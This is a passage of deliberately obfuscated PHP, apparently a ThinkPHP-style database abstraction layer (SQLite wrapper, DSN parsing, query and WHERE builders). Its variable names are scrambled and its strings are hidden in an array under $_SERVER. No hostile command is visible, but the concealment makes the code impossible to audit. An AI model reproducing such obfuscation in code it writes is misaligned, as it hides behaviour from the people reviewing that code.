$µñ¥Œµª[$Á¼æ”Â½[57]]); } } return $µÇşÛñ; } public function getTables($Ø¥É ‡ˆ = '') { $”‹‡ãë” =& $_SERVER[¬ÏÕ§Áú]; $…•œ«íÄ = $this->query($”‹‡ãë”[45] . $”‹‡ãë”[46] . $”‹‡ãë”[47]); $¦……ÛÅ€ = array(); foreach ($…•œ«íÄ as $è¥ğ÷èŸ => $˜ƒü²íİ) { $¦……ÛÅ€[$è¥ğ÷èŸ] = current($˜ƒü²íİ); } return $¦……ÛÅ€; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $™¹¥ĞºÆ =& $_SERVER[¬ÏÕ§Áú]; $this->error = $this->_linkID->lastErrorMsg(); if ($™¹¥ĞºÆ[12] != $this->queryStr) { $this->error .= LNG($™¹¥ĞºÆ[48]) . $this->queryStr; } think_trace($this->error, $™¹¥ĞºÆ[12], $™¹¥ĞºÆ[49]); return $this->error; } public function escapeString($’Àˆ¬’Ù) { $õîƒ¨  =& $_SERVER[¬ÏÕ§Áú]; if ($this->_linkID) { return $this->_linkID->escapeString($’Àˆ¬’Ù); } return str_ireplace($õîƒ¨ [58], $õîƒ¨ [59], $’Àˆ¬’Ù); } public function parseLimit($Ìµıš´) { $Ğà­ÜŸ =& $_SERVER[¬ÏÕ§Áú]; $«àÊ› = $Ğà­ÜŸ[12]; if (!empty($Ìµıš´)) { $Ìµıš´ = explode($Ğà­ÜŸ[50], $Ìµıš´); if (count($Ìµıš´) > 1) { $«àÊ› .= $Ğà­ÜŸ[51] . $Ìµıš´[1] . $Ğà­ÜŸ[52] . $Ìµıš´[0] . $Ğà­ÜŸ[53]; } else { $«àÊ› .= $Ğà­ÜŸ[51] . $Ìµıš´[0] . $Ğà­ÜŸ[53]; } } return $«àÊ›; } } goto CÃèŒà÷¿ƒ; CÃŠ±¤¶Ğß: class DbSqlite3 extends DbSqlite3Base { public function query($×”¹ô’«) { $şîÈúÛ” =& $_SERVER[¬ÏÕ§Áú]; if (!CacheLock::fileLock($şîÈúÛ”[13])) { return !1; } $“íƒ«œ¬ = parent::query($×”¹ô’«); CacheLock::fileUnLock($şîÈúÛ”[13]); return $“íƒ«œ¬; } public function execute($Œşü¡¿) { $–ºè‹§ =& $_SERVER[¬ÏÕ§Áú]; if (!CacheLock::fileLock($–ºè‹§[13])) { return !1; } $³éµœêŠ = parent::execute($Œşü¡¿); CacheLock::fileUnLock($–ºè‹§[13]); return $³éµœêŠ; } } class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\x5f\164\x68\x69\x6e\153\x5f"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $configLast = ''; protected $exp = array("\145\161" => "\x3d", "\156\x65\x71" => "\x3c\x3e", "\x67\164" => "\76", "\x65\147\164" => "\76\x3d", "\154\164" => "\x3c", "\x65\x6c\164" => "\x3c\x3d", "\156\157\164\x6c\151\x6b\x65" => "\116\x4f\124\40\x4c\111\x4b\x45", "\x6c\151\153\x65" => "\x4c\x49\x4b\x45", "\x69\156" => "\111\x4e", "\156\x6f\164\151\x6e" => "\116\x4f\x54\x20\x49\x4e", "\x6e\157\x74\40\x69\x6e" => "\x4e\117\124\x20\111\x4e", "\142\x65\164\x77\x65\x65\x6e" => "\x42\x45\x54\127\x45\x45\x4e", "\156\157\164\x62\145\x74\167\145\145\156" => "\116\117\124\40\x42\x45\x54\x57\x45\105\116", "\156\x6f\x74\x20\x62\145\x74\x77\145\x65\156" => "\116\117\124\x20\102\105\124\127\105\x45\116"); protected $selectSql = "\123\105\114\x45\x43\x54\x25\104\x49\x53\124\x49\x4e\x43\x54\45\40\45\x46\111\x45\114\x44\45\x20\x46\x52\117\115\x20\x25\x54\x41\102\114\x45\x25\45\112\x4f\x49\x4e\x25\x25\x57\x48\105\x52\x45\x25\x25\x47\122\117\125\120\x25\45\x48\x41\126\x49\x4e\107\45\45\117\122\104\x45\x52\x25\x25\x4c\x49\115\111\x54\45\40\45\125\116\111\x4f\116\45\x25\x43\117\x4d\x4d\x45\x4e\124\45"; protected $bind = array(); public static function getInstance() { $¢—£ôÈî = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[¬ÏÕ§Áú][1085], $¢—£ôÈî); } public function factory($å¹ŒŠ€œ = '') { $ÚäÈÁ´Ò =& $_SERVER[¬ÏÕ§Áú]; $å¹ŒŠ€œ = $this->parseConfig($å¹ŒŠ€œ); if (empty($å¹ŒŠ€œ[$ÚäÈÁ´Ò[1086]])) { think_exception(think_lang($ÚäÈÁ´Ò[1087])); } $this->dbType = ucwords(strtolower($å¹ŒŠ€œ[$ÚäÈÁ´Ò[1086]])); $¤“ôÏ‘ö = $ÚäÈÁ´Ò[1088] . $this->dbType; if (class_exists($¤“ôÏ‘ö)) { $–±Áàá£ = new $¤“ôÏ‘ö($å¹ŒŠ€œ); if ($ÚäÈÁ´Ò[1089] != strtolower($å¹ŒŠ€œ[$ÚäÈÁ´Ò[1086]])) { $–±Áàá£->dbType = strtoupper($this->dbType); } else { $–±Áàá£->dbType = $this->_getDsnType($å¹ŒŠ€œ[$ÚäÈÁ´Ò[1041]]); } } else { think_exception(think_lang($ÚäÈÁ´Ò[1090]) . $ÚäÈÁ´Ò[1091] . $¤“ôÏ‘ö); } return $–±Áàá£; } public function __call($±Î†ûö’, $öèñ¢”ä) { if (method_exists($this, $±Î†ûö’)) { return call_user_func_array(array($this, $±Î†ûö’), $öèñ¢”ä); } } protected function _getDsnType($½‚í²³³) { $ÇÖ¦†—Ş = explode($_SERVER[¬ÏÕ§Áú][4], $½‚í²³³); $ˆÔª­ı = strtoupper(trim($ÇÖ¦†—Ş[0])); return $ˆÔª­ı; } private function parseConfig($ş‡Òü¼ò = '') { $™ÊÇŠÉÁ =& $_SERVER[¬ÏÕ§Áú]; if (!empty($ş‡Òü¼ò) && is_string($ş‡Òü¼ò)) { $ş‡Òü¼ò = $this->parseDSN($ş‡Òü¼ò); } elseif (is_array($ş‡Òü¼ò)) { $ş‡Òü¼ò = array_change_key_case($ş‡Òü¼ò); $ş‡Òü¼ò = array($™ÊÇŠÉÁ[1086] => $ş‡Òü¼ò[$™ÊÇŠÉÁ[1092]], $™ÊÇŠÉÁ[1010] => $ş‡Òü¼ò[$™ÊÇŠÉÁ[1093]], $™ÊÇŠÉÁ[1011] => $ş‡Òü¼ò[$™ÊÇŠÉÁ[1094]], $™ÊÇŠÉÁ[1008] => $ş‡Òü¼ò[$™ÊÇŠÉÁ[1095]], $™ÊÇŠÉÁ[1009] => $ş‡Òü¼ò[$™ÊÇŠÉÁ[1096]], $™ÊÇŠÉÁ[21] => $ş‡Òü¼ò[$™ÊÇŠÉÁ[1097]], $™ÊÇŠÉÁ[1041] => $ş‡Òü¼ò[$™ÊÇŠÉÁ[1098]], $™ÊÇŠÉÁ[17] => isset($ş‡Òü¼ò[$™ÊÇŠÉÁ[1099]]) ? $ş‡Òü¼ò[$™ÊÇŠÉÁ[1099]] : array()); } elseif (empty($ş‡Òü¼ò)) { if (think_config($™ÊÇŠÉÁ[1100]) && $™ÊÇŠÉÁ[1089] != strtolower(think_config($™ÊÇŠÉÁ[1101]))) { $ş‡Òü¼ò = $this->parseDSN(think_config($™ÊÇŠÉÁ[1100])); } else { $ş‡Òü¼ò = array($™ÊÇŠÉÁ[1086] => think_config($™ÊÇŠÉÁ[1101]), $™ÊÇŠÉÁ[1010] => think_config($™ÊÇŠÉÁ[1102]), $™ÊÇŠÉÁ[1011] => think_config($™ÊÇŠÉÁ[1103]), $™ÊÇŠÉÁ[1008] => think_config($™ÊÇŠÉÁ[1104]), $™ÊÇŠÉÁ[1009] => think_config($™ÊÇŠÉÁ[1105]), $™ÊÇŠÉÁ[21] => think_config($™ÊÇŠÉÁ[335]), $™ÊÇŠÉÁ[1041] => think_config($™ÊÇŠÉÁ[1100]), $™ÊÇŠÉÁ[17] => think_config($™ÊÇŠÉÁ[1106])); } } return $ş‡Òü¼ò; } protected function initConnect($‚é”âÓ = true) { if (1 == think_config($_SERVER[¬ÏÕ§Áú][22])) { $this->_linkID = $this->multiConnect($‚é”âÓ); } else { if (isset($this->config) && $this->config) { $this->configLast = $this->config; } } if (!isset($this->connected) || !$this->connected) { $this->_linkID = $this->connect(); } } protected function closeConnect() { if (!$this->connected) { return; } foreach ($this->linkID as $¼–„˜® => $€­äë£ñ) { $this->_linkID = $€­äë£ñ; $this->close(); } $this->linkID = array(); $this->_linkID = null; $this->connected = !1; if (!$this->config && $this->configLast) { $this->config = $this->configLast; } } protected function multiConnect($„¢ÎË†ª = false) { $ñ³ÌÒúÉ =& $_SERVER[¬ÏÕ§Áú]; static $¯³‡íèä = array(); static $¶ƒÆÉÛü = -1; if (empty($¯³‡íèä)) { foreach ($this->config as $Í™‰ş¿ => $Ø‹˜½Ô) { $¯³‡íèä[$Í™‰ş¿] = explode($ñ³ÌÒúÉ[50], $Ø‹˜½Ô); } } if (think_config($ñ³ÌÒúÉ[1107])) { if ($„¢ÎË†ª || think_config($ñ³ÌÒúÉ[491]) === !0) { $ï—§©À = floor(mt_rand(0, think_config($ñ³ÌÒúÉ[1108]) - 1)); $¶ƒÆÉÛü = $ï—§©À; } else { if (is_numeric(think_config($ñ³ÌÒúÉ[1109]))) { $ï—§©À = think_config($ñ³ÌÒúÉ[1109]); } else { $ï—§©À = floor(mt_rand(think_config($ñ³ÌÒúÉ[1108]), count($¯³‡íèä[$ñ³ÌÒúÉ[1008]]) - 1)); } } } else { $ï—§©À = floor(mt_rand(0, count($¯³‡íèä[$ñ³ÌÒúÉ[1008]]) - 1)); $¶ƒÆÉÛü = $ï—§©À; } $ï—§©À = $¶ƒÆÉÛü !== -1 ? $¶ƒÆÉÛü : $ï—§©À; $‘Ò­õìÙ = array($ñ³ÌÒúÉ[1010] => isset($¯³‡íèä[$ñ³ÌÒúÉ[1010]][$ï—§©À]) ? $¯³‡íèä[$ñ³ÌÒúÉ[1010]][$ï—§©À] : $¯³‡íèä[$ñ³ÌÒúÉ[1010]][0], $ñ³ÌÒúÉ[1011] => isset($¯³‡íèä[$ñ³ÌÒúÉ[1011]][$ï—§©À]) ? $¯³‡íèä[$ñ³ÌÒúÉ[1011]][$ï—§©À] : $¯³‡íèä[$ñ³ÌÒúÉ[1011]][0], $ñ³ÌÒúÉ[1008] => isset($¯³‡íèä[$ñ³ÌÒúÉ[1008]][$ï—§©À]) ? $¯³‡íèä[$ñ³ÌÒúÉ[1008]][$ï—§©À] : $¯³‡íèä[$ñ³ÌÒúÉ[1008]][0], $ñ³ÌÒúÉ[1009] => isset($¯³‡íèä[$ñ³ÌÒúÉ[1009]][$ï—§©À]) ? $¯³‡íèä[$ñ³ÌÒúÉ[1009]][$ï—§©À] : $¯³‡íèä[$ñ³ÌÒúÉ[1009]][0], $ñ³ÌÒúÉ[21] => isset($¯³‡íèä[$ñ³ÌÒúÉ[21]][$ï—§©À]) ? $¯³‡íèä[$ñ³ÌÒúÉ[21]][$ï—§©À] : $¯³‡íèä[$ñ³ÌÒúÉ[21]][0], $ñ³ÌÒúÉ[1041] => isset($¯³‡íèä[$ñ³ÌÒúÉ[1041]][$ï—§©À]) ? $¯³‡íèä[$ñ³ÌÒúÉ[1041]][$ï—§©À] : $¯³‡íèä[$ñ³ÌÒúÉ[1041]][0], $ñ³ÌÒúÉ[17] => isset($¯³‡íèä[$ñ³ÌÒúÉ[17]][$ï—§©À]) ? $¯³‡íèä[$ñ³ÌÒúÉ[17]][$ï—§©À] : $¯³‡íèä[$ñ³ÌÒúÉ[17]][0]); return $this->connect($‘Ò­õìÙ, $ï—§©À); } public function parseDSN($éÓÍîÁ) { $£§Š²Ğ =& $_SERVER[¬ÏÕ§Áú]; if (empty($éÓÍîÁ)) { return !1; } $ˆš¡Ù¹á = parse_url($éÓÍîÁ); if ($ˆš¡Ù¹á[$£§Š²Ğ[218]]) { $Ìèéğ±Î = array($£§Š²Ğ[1086] => $ˆš¡Ù¹á[$£§Š²Ğ[218]], $£§Š²Ğ[1010] => isset($ˆš¡Ù¹á[$£§Š²Ğ[686]]) ? $ˆš¡Ù¹á[$£§Š²Ğ[686]] : $£§Š²Ğ[12], $£§Š²Ğ[1011] => isset($ˆš¡Ù¹á[$£§Š²Ğ[1110]]) ? $ˆš¡Ù¹á[$£§Š²Ğ[1110]] : $£§Š²Ğ[12], $£§Š²Ğ[1008] => isset($ˆš¡Ù¹á[$£§Š²Ğ[219]]) ? $ˆš¡Ù¹á[$£§Š²Ğ[219]] : $£§Š²Ğ[12], $£§Š²Ğ[1009] => isset($ˆš¡Ù¹á[$£§Š²Ğ[220]]) ? $ˆš¡Ù¹á[$£§Š²Ğ[220]] : $£§Š²Ğ[12], $£§Š²Ğ[21] => isset($ˆš¡Ù¹á[$£§Š²Ğ[97]]) ? substr($ˆš¡Ù¹á[$£§Š²Ğ[97]], 1) : $£§Š²Ğ[12]); } else { preg_match($£§Š²Ğ[1111], trim($éÓÍîÁ), $ºÃ¤Ÿ‚‡); $Ìèéğ±Î = array($£§Š²Ğ[1086] => $ºÃ¤Ÿ‚‡[1], $£§Š²Ğ[1010] => $ºÃ¤Ÿ‚‡[2], $£§Š²Ğ[1011] => $ºÃ¤Ÿ‚‡[3], $£§Š²Ğ[1008] => $ºÃ¤Ÿ‚‡[4], $£§Š²Ğ[1009] => $ºÃ¤Ÿ‚‡[5], $£§Š²Ğ[21] => $ºÃ¤Ÿ‚‡[6]); } $Ìèéğ±Î[$£§Š²Ğ[1041]] = $£§Š²Ğ[12]; return $Ìèéğ±Î; } protected function debug() { $ûéËÇÚÓ =& $_SERVER[¬ÏÕ§Áú]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $ûéËÇÚÓ[1112]; if (think_config($ûéËÇÚÓ[1113])) { think_status($ûéËÇÚÓ[1114]); think_trace($this->queryStr . $ûéËÇÚÓ[1115] . think_status($ûéËÇÚÓ[24], $ûéËÇÚÓ[1114], 6) . $ûéËÇÚÓ[1116], $ûéËÇÚÓ[12], $ûéËÇÚÓ[1117]); } } protected function parseLock($¾¬Ú£¾¦ = false) { $ŒÂ¡¾÷ =& $_SERVER[¬ÏÕ§Áú]; if (!$¾¬Ú£¾¦) { return $ŒÂ¡¾÷[12]; } if ($ŒÂ¡¾÷[1043] == $this->dbType) { return $ŒÂ¡¾÷[1118]; } return $ŒÂ¡¾÷[1119]; } protected function parseSet($…«»†£Œ) { $·Ì«ğ è =& $_SERVER[¬ÏÕ§Áú]; foreach ($…«»†£Œ as $¶èÊ¦Ëˆ => $‡¹—²í) { if (is_array($‡¹—²í) && $·Ì«ğ è[383] == $‡¹—²í[0]) { $Ë¹ŸœÍ¤[] = $this->parseKey($¶èÊ¦Ëˆ) . $·Ì«ğ è[473] . $‡¹—²í[1]; } elseif (is_scalar($‡¹—²í) || is_null($‡¹—²í)) { $Ë¹ŸœÍ¤[] = $this->parseKey($¶èÊ¦Ëˆ) . $·Ì«ğ è[473] . $this->parseValue($‡¹—²í); } } return $·Ì«ğ è[1120] . implode($·Ì«ğ è[50], $Ë¹ŸœÍ¤); } protected function bindParam($µÇÚ©, $¶ß¥˜‘) { $this->bind[$_SERVER[¬ÏÕ§Áú][4] . $µÇÚ©] = $¶ß¥˜‘; } protected function parseBind($î¨«şÏ˜) { $î¨«şÏ˜ = array_merge($this->bind, $î¨«şÏ˜); $this->bind = array(); return $î¨«şÏ˜; } function parseKey(&$×íáíùÂ, $¼Çšö ş = true) { if ($¼Çšö ş) { $×íáíùÂ = $this->parseKeyCheck($×íáíùÂ); } return $×íáíùÂ; } function parseKeyCheck($Û…Ãºâï) { $’›×İº =& $_SERVER[¬ÏÕ§Áú]; $Û…Ãºâï = trim($Û…Ãºâï); if (!preg_match($’›×İº[1121], $Û…Ãºâï)) { think_exception($’›×İº[1122] . $Û…Ãºâï); } return $Û…Ãºâï; } protected function parseValue($¨á×ÙñŠ) { $‘ÁÊÍé =& $_SERVER[¬ÏÕ§Áú]; if (is_string($¨á×ÙñŠ)) { $¨á×ÙñŠ = $‘ÁÊÍé[1082] . $this->escapeString($¨á×ÙñŠ) . $‘ÁÊÍé[1082]; } elseif (isset($¨á×ÙñŠ[0]) && is_string($¨á×ÙñŠ[0]) && strtolower($¨á×ÙñŠ[0]) == $‘ÁÊÍé[383]) { $¨á×ÙñŠ = $this->escapeString($¨á×ÙñŠ[1]); } elseif (is_array($¨á×ÙñŠ)) { $¨á×ÙñŠ = array_map(array($this, $‘ÁÊÍé[1083]), $¨á×ÙñŠ); } elseif (is_bool($¨á×ÙñŠ)) { $¨á×ÙñŠ = $¨á×ÙñŠ ? $‘ÁÊÍé[101] : $‘ÁÊÍé[241]; } elseif (is_null($¨á×ÙñŠ)) { $¨á×ÙñŠ = $‘ÁÊÍé[116]; } return $¨á×ÙñŠ; } protected function parseField($—”Òà€•) { $Ü…Ô†µ =& $_SERVER[¬ÏÕ§Áú]; if (is_string($—”Òà€•) && strpos($—”Òà€•, $Ü…Ô†µ[50])) { $—”Òà€• = explode($Ü…Ô†µ[50], $—”Òà€•); } if (is_array($—”Òà€•)) { $ŞÕà™¤ = array(); foreach ($—”Òà€• as $òŠĞ‚ìñ => $îû±ŒÆÖ) { if (!is_numeric($òŠĞ‚ìñ)) { $ŞÕà™¤[] = $this->parseKey($òŠĞ‚ìñ, !1) . $Ü…Ô†µ[1123] . $this->parseKey($îû±ŒÆÖ); } else { $ŞÕà™¤[] = $this->parseKey($îû±ŒÆÖ); } } $¸ºÕ—ÄŞ = implode($Ü…Ô†µ[50], $ŞÕà™¤); } elseif (is_string($—”Òà€•) && !empty($—”Òà€•)) { $¸ºÕ—ÄŞ = $—”Òà€•; } else { $¸ºÕ—ÄŞ = $Ü…Ô†µ[233]; } return $¸ºÕ—ÄŞ; } protected function parseTable($îıÆ®Ù¦) { $ÀÓ‡Ú·™ =& $_SERVER[¬ÏÕ§Áú]; if (is_array($îıÆ®Ù¦)) { $¹‹ö÷„ø = array(); foreach ($îıÆ®Ù¦ as $Ö©†Ô”× => $–ÊµÉ²™) { if (!is_numeric($Ö©†Ô”×)) { $¹‹ö÷„ø[] = $this->parseKey($Ö©†Ô”×) . $ÀÓ‡Ú·™[53] . $this->parseKey($–ÊµÉ²™); } else { $¹‹ö÷„ø[] = $this->parseKey($Ö©†Ô”×); } } $îıÆ®Ù¦ = $¹‹ö÷„ø; } elseif (is_string($îıÆ®Ù¦)) { if (strstr($îıÆ®Ù¦, $ÀÓ‡Ú·™[53])) { return $îıÆ®Ù¦; } $îıÆ®Ù¦ = explode($ÀÓ‡Ú·™[50], $îıÆ®Ù¦); array_walk($îıÆ®Ù¦, array($this, $ÀÓ‡Ú·™[1028])); } return $ÀÓ‡Ú·™[1022] . trim(implode($ÀÓ‡Ú·™[1124], $îıÆ®Ù¦), $ÀÓ‡Ú·™[481]) . $ÀÓ‡Ú·™[1022]; } protected function parseWhere($ğÛã¯‚Ø) { $­û˜íüÃ =& $_SERVER[¬ÏÕ§Áú]; $²ÖŒ…©˜ = $­û˜íüÃ[12]; if (is_string($ğÛã¯‚Ø)) { $²ÖŒ…©˜ = $ğÛã¯‚Ø; } else { $ïô‰„é = isset($ğÛã¯‚Ø[$­û˜íüÃ[1125]]) ? strtoupper($ğÛã¯‚Ø[$­û˜íüÃ[1125]]) : $­û˜íüÃ[12]; if (in_array($ïô‰„é, array($­û˜íüÃ[1126], $­û˜íüÃ[1127], $­û˜íüÃ[1128]))) { $ïô‰„é = $­û˜íüÃ[53] . $ïô‰„é . $­û˜íüÃ[53]; unset($ğÛã¯‚Ø[$­û˜íüÃ[1125]]); } else { $ïô‰„é = $­û˜íüÃ[1129]; } foreach ($ğÛã¯‚Ø as $»”ª«æ° => $òùè€®¯) { $²ÖŒ…©˜ .= $­û˜íüÃ[366]; if (is_numeric($»”ª«æ°)) { $»”ª«æ° = $­û˜íüÃ[1130]; } if (0 === strpos($»”ª«æ°, $­û˜íüÃ[11])) { $²ÖŒ…©˜ .= $this->parseThinkWhere($»”ª«æ°, $òùè€®¯); } else { if (!preg_match($­û˜íüÃ[1131], trim($»”ª«æ°))) { think_exception(think_lang($­û˜íüÃ[1132]) . $­û˜íüÃ[4] . $»”ª«æ°); } $¦¸âÄ«´ = is_array($òùè€®¯) && isset($òùè€®¯[$­û˜íüÃ[1133]]); $»”ª«æ° = trim($»”ª«æ°); if (strpos($»”ª«æ°, $­û˜íüÃ[225])) { $¦ö¹ï§Ç = explode($­û˜íüÃ[225], $»”ª«æ°); $ªÂ…ÉĞÉ = array(); foreach ($¦ö¹ï§Ç as $Ú¸Ñ‹µö => $ÃöÂæÎ˜) { $¥‰ŠúÕ = $¦¸âÄ«´ ? $òùè€®¯[$Ú¸Ñ‹µö] : $òùè€®¯; $ªÂ…ÉĞÉ[] = $­û˜íüÃ[349] . $this->parseWhereItem($this->parseKey($ÃöÂæÎ˜), $¥‰ŠúÕ) . $­û˜íüÃ[1027]; } $²ÖŒ…©˜ .= implode($­û˜íüÃ[1134], $ªÂ…ÉĞÉ); } elseif (strpos($»”ª«æ°, $­û˜íüÃ[297])) { $¦ö¹ï§Ç = explode($­û˜íüÃ[297], $»”ª«æ°); $ªÂ…ÉĞÉ = array(); foreach ($¦ö¹ï§Ç as $Ú¸Ñ‹µö => $ÃöÂæÎ˜) { $¥‰ŠúÕ = $¦¸âÄ«´ ? $òùè€®¯[$Ú¸Ñ‹µö] : $òùè€®¯; $ªÂ…ÉĞÉ[] = $­û˜íüÃ[349] . $this->parseWhereItem($this->parseKey($ÃöÂæÎ˜), $¥‰ŠúÕ) . $­û˜íüÃ[1027]; } $²ÖŒ…©˜ .= implode($­û˜íüÃ[1129], $ªÂ…ÉĞÉ); } else { $²ÖŒ…©˜ .= $this->parseWhereItem($this->parseKey($»”ª«æ°), $òùè€®¯); } } $²ÖŒ…©˜ .= $­û˜íüÃ[367] . $ïô‰„é; } $²ÖŒ…©˜ = substr($²ÖŒ…©˜, 0, -strlen($ïô‰„é)); } return empty($²ÖŒ…©˜) ? $­û˜íüÃ[12] : $­û˜íüÃ[1135] . $²ÖŒ…©˜; } protected function parseWhereItem($ôûºûâİ, $üÕ¼Ì¯Œ) { $Üê‡ç¼¸ =& $_SERVER[¬ÏÕ§Áú]; $¿¨èÄˆ» = $Üê‡ç¼¸[12]; if (is_array($üÕ¼Ì¯Œ)) { if (is_string($üÕ¼Ì¯Œ[0])) { $¬ÃŸĞ›´ = strtolower($üÕ¼Ì¯Œ[0]); if (in_array($üÕ¼Ì¯Œ[0], array($Üê‡ç¼¸[473], $Üê‡ç¼¸[1136], $Üê‡ç¼¸[1137], $Üê‡ç¼¸[1138], $Üê‡ç¼¸[1139], $Üê‡ç¼¸[1140]))) { $¿¨èÄˆ» .= $ôûºûâİ . $Üê‡ç¼¸[53] . $üÕ¼Ì¯Œ[0] . $Üê‡ç¼¸[53] . $this->parseValue($üÕ¼Ì¯Œ[1]); } elseif (preg_match($Üê‡ç¼¸[1141], $üÕ¼Ì¯Œ[0])) { $¿¨èÄˆ» .= $ôûºûâİ . $Üê‡ç¼¸[53] . $this->exp[$¬ÃŸĞ›´] . $Üê‡ç¼¸[53] . $this->parseValue($üÕ¼Ì¯Œ[1]); } elseif (preg_match($Üê‡ç¼¸[1142], $üÕ¼Ì¯Œ[0])) { if (is_array($üÕ¼Ì¯Œ[1])) { $›Éäû£ß = isset($üÕ¼Ì¯Œ[2]) ? strtoupper($üÕ¼Ì¯Œ[2]) : $Üê‡ç¼¸[1127]; if (in_array($›Éäû£ß, array($Üê‡ç¼¸[1126], $Üê‡ç¼¸[1127], $Üê‡ç¼¸[1128]))) { $“åÉœ = array(); foreach ($üÕ¼Ì¯Œ[1] as $í©Ÿ®ãù) { $“åÉœ[] = $ôûºûâİ . $Üê‡ç¼¸[53] . $this->exp[$¬ÃŸĞ›´] . $Üê‡ç¼¸[53] . $this->parseValue($í©Ÿ®ãù); } $¿¨èÄˆ» .= $Üê‡ç¼¸[349] . implode($Üê‡ç¼¸[53] . $›Éäû£ß . $Üê‡ç¼¸[53], $“åÉœ) . $Üê‡ç¼¸[1027]; } } else { $¿¨èÄˆ» .= $ôûºûâİ . $Üê‡ç¼¸[53] . $this->exp[$¬ÃŸĞ›´] . $Üê‡ç¼¸[53] . $this->parseValue($üÕ¼Ì¯Œ[1]); } } elseif ($Üê‡ç¼¸[383] == $¬ÃŸĞ›´) { $¿¨èÄˆ» .= $Üê‡ç¼¸[1025] . $ôûºûâİ . $Üê‡ç¼¸[53] . $üÕ¼Ì¯Œ[1] . $Üê‡ç¼¸[1143]; } elseif (preg_match($Üê‡ç¼¸[1144], $üÕ¼Ì¯Œ[0])) { $¿¨èÄˆ» .= $üÕ¼Ì¯Œ[0]; } elseif (preg_match($Üê‡ç¼¸[1145], $üÕ¼Ì¯Œ[0])) { if (isset($üÕ¼Ì¯Œ[2]) && $Üê‡ç¼¸[383] == $üÕ¼Ì¯Œ[2]) { $¿¨èÄˆ» .= $ôûºûâİ . $Üê‡ç¼¸[53] . $this->exp[$¬ÃŸĞ›´] . $Üê‡ç¼¸[53] . $üÕ¼Ì¯Œ[1]; } else { if (is_string($üÕ¼Ì¯Œ[1])) { $üÕ¼Ì¯Œ[1] = explode($Üê‡ç¼¸[50], $üÕ¼Ì¯Œ[1]); } $ë³–à·ä = implode($Üê‡ç¼¸[50], $this->parseValue($üÕ¼Ì¯Œ[1])); $¿¨èÄˆ» .= $ôûºûâİ . $Üê‡ç¼¸[53] . $this->exp[$¬ÃŸĞ›´] . $Üê‡ç¼¸[1025] . $ë³–à·ä . $Üê‡ç¼¸[1027]; } } elseif (preg_match($Üê‡ç¼¸[1146], $üÕ¼Ì¯Œ[0])) { $¾¿¹•ŞÓ = is_string($üÕ¼Ì¯Œ[1]) ? explode($Üê‡ç¼¸[50], $üÕ¼Ì¯Œ[1]) : $üÕ¼Ì¯Œ[1]; $¿¨èÄˆ» .= $Üê‡ç¼¸[1025] . $ôûºûâİ . $Üê‡ç¼¸[53] . $this->exp[$¬ÃŸĞ›´] . $Üê‡ç¼¸[53] . $this->parseValue($¾¿¹•ŞÓ[0]) . $Üê‡ç¼¸[1129] . $this->parseValue($¾¿¹•ŞÓ[1]) . $Üê‡ç¼¸[367]; } else { think_exception(think_lang($Üê‡ç¼¸[1132]) . $Üê‡ç¼¸[4] . $üÕ¼Ì¯Œ[0]); } } else { $Ê¸»µß = count($üÕ¼Ì¯Œ); $À£Ó = $Üê‡ç¼¸[12]; if (is_string($üÕ¼Ì¯Œ[$Ê¸»µß - 1])) { $À£Ó = isset($üÕ¼Ì¯Œ[$Ê¸»µß - 1]) ? strtoupper($üÕ¼Ì¯Œ[$Ê¸»µß - 1]) : $Üê‡ç¼¸[12]; if (in_array($À£Ó, array($Üê‡ç¼¸[1126], $Üê‡ç¼¸[1127], $Üê‡ç¼¸[1128]))) { $Ê¸»µß = $Ê¸»µß - 1; } } else { $À£Ó = $Üê‡ç¼¸[1126]; } for ($ûÄ†ı = 0; $ûÄ†ı < $Ê¸»µß; $ûÄ†ı++) { $¾¿¹•ŞÓ = is_array($üÕ¼Ì¯Œ[$ûÄ†ı]) ? $üÕ¼Ì¯Œ[$ûÄ†ı][1] : $üÕ¼Ì¯Œ[$ûÄ†ı]; if ($Üê‡ç¼¸[383] == strtolower($üÕ¼Ì¯Œ[$ûÄ†ı][0])) { $¿¨èÄˆ» .= $Üê‡ç¼¸[349] . $ôûºûâİ . $Üê‡ç¼¸[53] . $¾¿¹•ŞÓ . $Üê‡ç¼¸[1143] . $À£Ó . $Üê‡ç¼¸[53]; } else { $ˆì‹‚¾ı = is_array($üÕ¼Ì¯Œ[$ûÄ†ı]) ? $this->exp[strtolower($üÕ¼Ì¯Œ[$ûÄ†ı][0])] : $Üê‡ç¼¸[473]; if (!$ˆì‹‚¾ı && is_array($üÕ¼Ì¯Œ[$ûÄ†ı]) && in_array($üÕ¼Ì¯Œ[$ûÄ†ı][0], array($Üê‡ç¼¸[473], $Üê‡ç¼¸[1136], $Üê‡ç¼¸[1137], $Üê‡ç¼¸[1138], $Üê‡ç¼¸[1139], $Üê‡ç¼¸[1140]))) { $ˆì‹‚¾ı = $üÕ¼Ì¯Œ[$ûÄ†ı][0]; } $¿¨èÄˆ» .= $Üê‡ç¼¸[349] . $ôûºûâİ . $Üê‡ç¼¸[53] . $ˆì‹‚¾ı . $Üê‡ç¼¸[53] . $this->parseValue($¾¿¹•ŞÓ) . $Üê‡ç¼¸[1143] . $À£Ó . $Üê‡ç¼¸[53]; } } $¿¨èÄˆ» = substr($¿¨èÄˆ», 0, -4); } } else { $¿¨èÄˆ» .= $ôûºûâİ . $Üê‡ç¼¸[1147] . $this->parseValue($üÕ¼Ì¯Œ); } return $¿¨èÄˆ»; } protected function parseThinkWhere($¾çƒ¥©÷, $Âòêƒéì) { $¯´êë =& $_SERVER[¬ÏÕ§Áú]; $·¹Ñ‰ÅÂ = $¯´êë[12]; switch ($¾çƒ¥©÷) { case $¯´êë[438]: $·¹Ñ‰ÅÂ = $Âòêƒéì; break; case $¯´êë[1130]: $·¹Ñ‰ÅÂ = is_string($Âòêƒéì) ? $Âòêƒéì : substr($this->parseWhere($Âòêƒéì), 6); break; case $¯´êë[1148]: parse_str($Âòêƒéì, $µë¾à°å); if (isset($µë¾à°å[$¯´êë[1125]])) { $­ä´¹‡ò = $¯´êë[53] . strtoupper($µë¾à°å[$¯´êë[1125]]) . $¯´êë[53]; unset($µë¾à°å[$¯´êë[1125]]); } else { $­ä´¹‡ò = 